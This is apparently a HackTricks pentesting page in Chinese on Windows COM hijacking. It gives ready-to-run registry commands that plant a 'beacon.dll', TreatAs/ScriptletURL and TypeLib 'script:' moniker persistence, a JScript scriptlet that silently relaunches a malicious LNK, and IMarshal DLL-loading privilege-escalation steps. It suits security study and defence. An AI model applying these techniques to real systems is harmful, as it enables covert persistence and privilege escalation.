# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 搜索不存在的 COM 组件

由于用户可以修改 HKCU 中的值，**COM Hijacking** 可用作**持久化机制**。使用 `procmon` 可以轻松找到尚不存在、攻击者可以创建的 COM 注册表项。经典筛选条件：

- **RegOpenKey** 操作。
- _Result_ 为 **NAME NOT FOUND**。
- _Path_ 以 **InprocServer32** 结尾。

搜寻时可使用以下其他筛选条件：

- 也要查找缺失的 **`LocalServer32`** 键。一些 COM 类是进程外服务器，会启动攻击者控制的 EXE，而不是 DLL。
- 除了 `InprocServer32`，也要搜索 **`TreatAs`** 和 **`ScriptletURL`** 注册表操作。近期的检测内容和恶意软件分析文章经常提到这些项，因为它们比普通 COM 注册罕见得多，因此具有较高的信号价值。
- 将注册克隆到 HKCU 时，从原始的 **`HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`** 复制合法的 **`ThreadingModel`**。使用错误的模型通常会导致激活失败，并使劫持行为更容易被察觉。<sup>[[3]](#references)</sup>
- 在 64 位系统上，同时检查 64 位和 32 位视图（`procmon.exe` 与 `procmon64.exe`、`HKLM\Software\Classes` 与 `HKLM\Software\Classes\WOW6432Node`），因为 32 位应用程序可能会解析到不同的 COM 注册项。

确定要冒充哪个不存在的 COM 后，执行以下命令。_如果决定冒充每隔几秒就会加载一次的 COM，请谨慎操作，因为这可能有些过度。_

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### 可劫持的任务计划程序 COM 组件

Windows 任务使用自定义触发器调用 COM 对象。由于这些对象通过任务计划程序执行，因此更容易预测它们何时会被触发。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

查看输出后，你可以选择一个例如**每次用户登录时**都会执行的任务。

接下来，在 **HKEY\CLASSES\ROOT\CLSID**、HKLM 和 HKCU 中搜索 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**，通常会发现 HKCU 中不存在该值。

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

然后，你只需创建 HKCU 项；每次用户登录时，你的 backdoor 都会被触发。

## 悬空 COM 注册与自定义封送处理

无需更改注册表，计算机范围的 COM 注册也可能成为 DLL planting 原语。查找 `InprocServer32` 值：其 DLL 不存在，且低权限用户可以创建或修改该值指向的完整路径。植入名称完全匹配的 DLL，即可让任何激活该 CLSID 的进程加载攻击者代码。在 CrossDevice 示例中，注册的路径为 `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`，因此标准用户可以创建缺失的子目录和 DLL。<sup>[[5]](#references)</sup>

### 可写插件映射作为特权 COM 激活路径

即使无法编辑类的计算机范围注册，可写的 plugin-ID-to-CLSID 映射也能让较低权限用户选择特权服务加载哪个进程内 COM 服务器。<sup>[[8]](#references)[[9]](#references)</sup> 在报告的 Windows 11 `InstallService` 案例中，标准用户可以修改 `StaticPluginMap`；非内置插件 ID 会选出一个 CLSID，供 `LocalSystem` 服务通过 `CoCreateInstance`，并使用 `CLSCTX_INPROC_SERVER` 和 `IID_IInstallServicePlugin` 进行调用。<sup>[[8]](#references)[[9]](#references)</sup> 已注册的 DLL 会加载到服务进程中，而不是单独的 COM 主机进程。<sup>[[10]](#references)</sup>

相关条件包括：对映射具有有效写入权限、存在可触发的插件请求，以及较低权限用户能够控制 `InprocServer32` DLL 路径。<sup>[[8]](#references)[[9]](#references)</sup> 上述 CrossDevice 注册在报告的案例中满足了路径条件。<sup>[[8]](#references)[[9]](#references)</sup> 成功创建的插件对象必须公开所请求的接口，但 DLL 会在 `CoCreateInstance` 完成之前加载；无法公开该接口本身并不能排除加载期间执行代码的可能性。<sup>[[8]](#references)[[11]](#references)</sup> 这种服务分派路径不同于下文的自定义 `IMarshal` 路径。有关单独的文件路径原语，请参阅 [DLL Hijacking](dll-hijacking/)。

### `IMarshal` 作为跨进程 DLL 加载原语

COM 通常使用标准 `OBJREF` 表示接口指针，并让接收方回到原始对象。实现 `IMarshal` 的对象则可以生成自定义 `OBJREF`。其 `GetUnmarshalClass` 方法提供用于在接收进程中重建对象的代码的 CLSID。该 CLSID 无需标识原始对象。COM 会将其解析为进程内服务器，并在分派所请求的接口方法之前加载已注册的 DLL。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

恶意实现只需在 `GetUnmarshalClass` 中替换为悬空 CLSID。<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

通过代理方法参数（例如 `[in] IUnknown *`）传递此对象。另一种方法是使用 `CoGetInstanceFromIStorage`，同时让经过自定义封送的对象实现足够的 `IStorage`，以通过本地检查。远程服务器自动执行解封送时，会解析被替换的 CLSID，因此 DLL 会在目标方法运行前加载。<sup>[[5]](#references)</sup>

该原语不限于缺失的注册项。它还可以强制接收方加载现有的 custom-unmarshaler DLL，并暴露其加载或解封送路径中的漏洞。<sup>[[5]](#references)</sup>

该利用链需要满足以下所有条件：<sup>[[5]](#references)</sup>

1. 机器可见的 CLSID 指向一个缺失或可替换的进程内 DLL。
2. 攻击者可以将该 DLL 放到解析出的路径。
3. 有一个可激活的进程外 COM 服务器以所需的权限级别运行。
4. 该服务器接受自定义封送，并公开一个代理调用，将攻击者对象跨进程边界传递。

### 查找悬空的进程内服务器

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) 和 [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) 可以枚举机器 COM 数据库，并通过常规 Win32 模块解析来测试每个服务器。相比 `Test-Path`，这种方法更可取，因为某些注册项只包含文件名，并依赖加载器搜索路径。<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

将结果视为候选列表，而非可利用性的证明。按照加载器的方式解析路径，然后检查第一个已存在的父目录以及目标 DLL（如果它已存在）上的 DACL。只有当攻击者能够创建或替换 COM 实际解析到的路径时，缺失的文件才有用。<sup>[[5]](#references)</sup>

### 选择并启动特权接收端

检查候选 COM 类的 `RunAs`、服务关联、可用接口和 RPC proxies。配置为 `SYSTEM` 但未由命名服务支持的类，可能无法直接激活，因为 RPCSS 无法启动它。遇到这种情况时，寻找能启动其宿主的非特权触发方式，例如可执行的计划任务，并重现让服务器保持运行所需的任何命名事件或 IPC 前置条件。<sup>[[5]](#references)</sup>

例如，易受攻击的 Shell Create Object Handler 链会先创建预期的全局事件，再调用用户可执行的计划任务，以此启动其宿主。<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

将生成的对象引用追溯到其宿主，并验证其身份和 marshaling 策略。然后枚举接口，并将其代理转换为 IDL，以查找诸如 IUnknown * 这样的输入参数，该参数会 marshal 伪造对象。<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### 自定义封送处理防护

合适的接收方不得拒绝不可信的自定义封送处理器。两种进程级防护措施是：在传递给 `CoInitializeSecurity` 的 capabilities 中设置 `EOAC_NO_CUSTOM_MARSHAL`，以及通过 `IGlobalOptions::Set` 设置 `COMGLB_UNMARSHALING_POLICY_STRONG`。启用 symbols 后，可在 `combase!gCapabilities` 和 `combase!g_GLBOPT_UnmarshalingPolicy` 中检查相应状态；在其进程解析器支持该 Windows 版本的情况下，NtObjectManager 会将结果显示为 `CustomMarshalAllowed`。<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` 允许一个 CLSID 模拟另一个 CLSID。<sup>[[4]](#references)</sup> 从攻防角度看，这意味着你可以保留原始 CLSID 不变，创建一个指向 `scrobj.dll` 的第二个 per-user CLSID，然后通过 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` 将真实 COM 对象重定向到恶意对象。

适用于以下情况：

- 目标应用程序在登录或启动时已经实例化一个稳定的 CLSID
- 你希望使用仅修改注册表的重定向，而不是替换原始 `InprocServer32`
- 你希望通过 `ScriptletURL` 值执行本地或远程 `.sct` scriptlet

示例工作流程（改编自公开的 Atomic Red Team tradecraft 和早期 COM 注册表滥用研究）：

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

说明：

- `scrobj.dll` 会读取 `ScriptletURL` 值并执行所引用的 `.sct`，因此 payload 可以保存在本地文件中，也可以通过 HTTP/HTTPS 从远程获取。
- 如果原始 COM 注册在 HKLM 中完整且稳定，`TreatAs` 尤其方便，因为只需创建一个小型的 per-user 重定向，无需镜像整个注册表树。
- 若要在不等待自然触发的情况下进行验证，可以使用 `rundll32.exe -sta <ProgID-or-CLSID>` 手动实例化伪造的 ProgID/CLSID，前提是目标类支持 STA 激活。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) 定义 COM 接口，并通过 `LoadTypeLib()` 加载。实例化 COM server 时，OS 也可能通过查询 `HKCR\TypeLib\{LIBID}` 下的注册表项来加载关联的 TypeLib。如果将 TypeLib 路径替换为 **moniker**，例如 `script:C:\...\evil.sct`，Windows 会在解析 TypeLib 时执行 scriptlet，从而实现一种隐蔽的持久化方式，在常见组件被访问时触发。

据观察，这种方式可针对 Microsoft Web Browser 控件（常由 Internet Explorer、嵌入 WebBrowser 的应用，甚至 `explorer.exe` 加载）。<sup>[[1]](#references)[[2]](#references)</sup>

### 步骤 (PowerShell)

1) 找出高频 CLSID 使用的 TypeLib (LIBID)。恶意软件链中常被滥用的 CLSID 示例：`{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) 将 per-user TypeLib 路径指向使用 `script:` moniker 的本地 scriptlet（无需管理员权限）：

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) 放置一个最简的 JScript `.sct`，用于重新启动你的主要 payload（例如初始链中使用的 `.lnk`）：

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) 触发——打开 IE、使用 WebBrowser 控件的应用程序，甚至常规的 Explorer 活动，都会加载 TypeLib 并执行 scriptlet，从而在登录/重启时重新启用你的链。

清理
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- 你可以将相同逻辑应用于其他高频 COM 组件；始终先从 `HKCR\CLSID\{CLSID}\TypeLib` 解析真实的 `LIBID`。
- 在 64 位系统上，你也可以填充 `win64` 子键，供 64 位使用者使用。

## References

- [1] [劫持 TypeLib——一种新的 COM 持久化技术 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research——ZipLine Campaign：针对美国公司的复杂网络钓鱼攻击](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [重新审视 COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques：Dangling COM Object Registrations](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal interface](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC 和技术说明 (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator：Windows Install Service 本地权限提升 (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX 枚举 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance 函数 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

